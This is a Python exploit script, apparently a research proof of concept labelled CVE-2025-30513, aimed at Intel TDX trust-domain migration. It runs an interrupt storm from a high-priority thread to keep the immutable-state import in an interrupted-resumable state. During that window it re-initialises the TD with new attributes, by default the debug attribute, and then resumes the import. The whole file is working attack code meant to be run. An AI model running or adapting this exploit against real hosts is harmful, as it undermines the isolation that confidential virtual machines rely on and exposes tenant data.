from argparse import ArgumentParser
from os import SCHED_FIFO
from subprocess import CalledProcessError, run
from threading import Event, Thread, get_ident
from time import sleep
from gateway import FOUR_KILOBYTES, Gateway
from tdxamine import State, TdData
from tdxtend import INVALID_PID, MBMD_SIZE, TdxErrorCode, TdxStatus, Tdxtend


DEBUG_ATTRIBUTE = 1 << 0
ICSSD_ATTRIBUTE = 1 << 16
MIGRATE_ATTRIBUTE = 1 << 29
PERFMON_ATTRIBUTE = 1 << 63


def ipi_storm_thread_function(
    gateway: Gateway, event: Event, cpu: int, count: int, delay: int
):

  gateway.set_thread_affinity(get_ident(), cpu + 1)
  gateway.set_process_priority(SCHED_FIFO, 99)

  while not event.is_set():
    gateway.ipi_storm(cpu, count, delay)


def chunk_buffer(buffer_data, chunk_size_bytes=FOUR_KILOBYTES) -> [bytes]:

  chunks = []
  for i in range(0, len(buffer_data), chunk_size_bytes):
    chunk = buffer_data[i : i + chunk_size_bytes]
    chunks.append(chunk)
  return chunks


def main():

  digby_logo = """
  digby: CVE-2025-30513 
  - Nibblonian that lost the keys and forgot where he parked.
  """

  print(digby_logo)

  parser = ArgumentParser(
      prog="digby",
      description="Nibblonian that lost the keys and forgot where he parked.",
  )

  parser.add_argument(
      "--state",
      type=str,
      default="state.pickle",
      help="State to load",
  )
  parser.add_argument(
      "tdr_pa",
      type=lambda x: int(x, 0),
      help="TDR PA of the TD",
  )
  parser.add_argument(
      "mbmd_file",
      type=str,
      help="mbmd file to use",
  )
  parser.add_argument(
      "immutable_file", type=str, help="immutable data file to use"
  )
  parser.add_argument("--cpu", type=int, default=8, help="CPU to exploit")
  parser.add_argument(
      "--attributes",
      type=int,
      default=DEBUG_ATTRIBUTE,
      help="Post Import TD attributes",
  )
  parser.add_argument(
      "--migs_index",
      type=lambda x: int(x, 0),
      default=0,
      help="index of the migration state",
  )
  parser.add_argument(
      "--num_in_order_migs",
      type=lambda x: int(x, 0),
      default=0,
      help="number of in-order migrations",
  )

  args = parser.parse_args()

  state = State(args.state)

  state.load(args.state)
  td = state.get_td_by_tdr_pa(args.tdr_pa)

  gateway = Gateway()
  tdxtend = Tdxtend(INVALID_PID, gateway)

  gateway.set_thread_affinity(get_ident(), args.cpu)

  plt_ka, plt_pa = gateway.alloc_contiguous_buffer(FOUR_KILOBYTES)

  imp_pg_ka_list = []

  # load the immutable data to buffers that can be used with the import API as 4KB chunks
  with open(args.immutable_file, "rb") as f:
    chunks = chunk_buffer(f.read(), FOUR_KILOBYTES)

  i = 0
  for chunk in chunks:
    imp_pg_ka, imp_pg_pa = gateway.alloc_contiguous_buffer(FOUR_KILOBYTES)
    gateway.write_buffer(chunk, imp_pg_ka)
    imp_pg_ka_list.append(imp_pg_ka)

    gateway.write_uint64(plt_ka + (i * 8), imp_pg_pa)
    i += 1

  # load the mbmd data to a buffer that can be used with the import API
  mbmd_ka, mbmd_pa = gateway.alloc_contiguous_buffer(FOUR_KILOBYTES)
  with open(args.mbmd_file, "rb") as f:
    mbmd = f.read()
  gateway.write_buffer(mbmd, mbmd_ka)

  # start a thread to send IPIs at a high rate to force the import API to exit with TDX_INTERRUPTED_RESUMABLE
  ipi_storm_event = Event()
  ipi_storm_thread = Thread(
      target=ipi_storm_thread_function,
      args=(gateway, ipi_storm_event, args.cpu, 1000000, 0),
  )
  ipi_storm_thread.start()
  sleep(2)

  # import the immutable state as MIGS_INDEX_COMMAND_NEW
  rc, _, _ = tdxtend.call_tdh_import_state_immutable(
      td.tdr_pa,
      tdxtend.make_mbmd(mbmd_pa, MBMD_SIZE),
      tdxtend.make_page_list_info(plt_pa, len(imp_pg_ka_list) - 1),
      tdxtend.make_migration_index_and_cmd(
          args.migs_index, args.num_in_order_migs, False
      ),
  )

  while rc == TdxErrorCode.TDX_INTERRUPTED_RESUMABLE.value:
    print(f"TDX STATUS: {TdxStatus(rc)}")

    # init the td to change the td attributes
    tdxtend.td_params_struct.set("attributes", args.attributes)
    params = tdxtend.td_params_struct.encode()

    td_params_ka, td_params_pa = gateway.alloc_contiguous_buffer(FOUR_KILOBYTES)
    gateway.write_buffer(params, td_params_ka)

    rc = tdxtend.call_tdh_mng_init_leaf(td.tdr_pa, td_params_pa)
    print(f"TDX STATUS: {TdxStatus(rc)}")
    gateway.free_contiguous_buffer(td_params_ka, FOUR_KILOBYTES)

    # import the immutable state as MIGS_INDEX_COMMAND_RESUME
    rc, _, _ = tdxtend.call_tdh_import_state_immutable(
        td.tdr_pa,
        tdxtend.make_mbmd(mbmd_pa, MBMD_SIZE),
        tdxtend.make_page_list_info(plt_pa, len(imp_pg_ka_list) - 1),
        tdxtend.make_migration_index_and_cmd(
            args.migs_index, args.num_in_order_migs, True
        ),
    )

  print(f"TDX STATUS: {TdxStatus(rc)}")

  ipi_storm_event.set()
  ipi_storm_thread.join()


if __name__ == "__main__":
  main()
